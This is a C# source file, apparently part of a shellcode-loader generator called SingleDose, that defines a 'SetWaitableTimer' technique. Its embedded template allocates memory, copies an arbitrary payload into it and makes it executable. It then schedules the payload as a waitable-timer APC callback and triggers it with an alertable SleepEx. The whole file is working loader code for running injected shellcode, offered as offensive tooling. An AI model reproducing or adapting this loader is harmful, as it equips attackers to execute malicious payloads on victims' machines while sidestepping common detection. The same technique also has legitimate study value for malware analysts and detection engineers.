using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class SetWaitableTimer : ITechnique
    {
        string ITechnique.TechniqueName => "SetWaitableTimer";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "CreateWaitableTimer", "SetWaitableTimer", "SleepEx" };

        List<string> ITechnique.Prerequisites => null;
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}

            IntPtr hTimer = CreateWaitableTimer(IntPtr.Zero, false, string.Empty);
            LARGE_INTEGER sLI = new LARGE_INTEGER();
            SetWaitableTimer(hTimer, ref sLI, 
                0, hAlloc, IntPtr.Zero, false);

            SleepEx(1000, true);
        }
        {{ARGS}}
        [StructLayout(LayoutKind.Explicit, Size = 8)]
        struct LARGE_INTEGER
        {
            [FieldOffset(0)] public Int64 QuadPart;
            [FieldOffset(0)] public UInt32 LowPart;
            [FieldOffset(4)] public Int32 HighPart;
        }

        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
